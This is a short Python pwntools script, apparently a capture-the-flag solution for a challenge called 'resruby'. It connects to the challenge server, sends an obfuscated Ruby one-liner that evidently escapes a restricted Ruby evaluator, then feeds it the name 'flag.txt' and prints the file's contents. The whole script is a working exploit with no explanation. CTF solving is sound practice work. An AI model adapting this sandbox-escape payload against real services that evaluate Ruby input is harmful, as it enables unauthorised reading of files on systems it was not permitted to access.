from pwn import *

p = remote("resruby.challs.csc.tf", 1337)

solve = """
$*.<<(*$<);/#{[*$<]}(/
""".strip()

p.sendlineafter(b"> ", solve.encode())
p.sendafter(b"ok", b"flag.txt")
p.shutdown() # equivalent to ctrl + d

print(p.recvall().decode())
p.close()
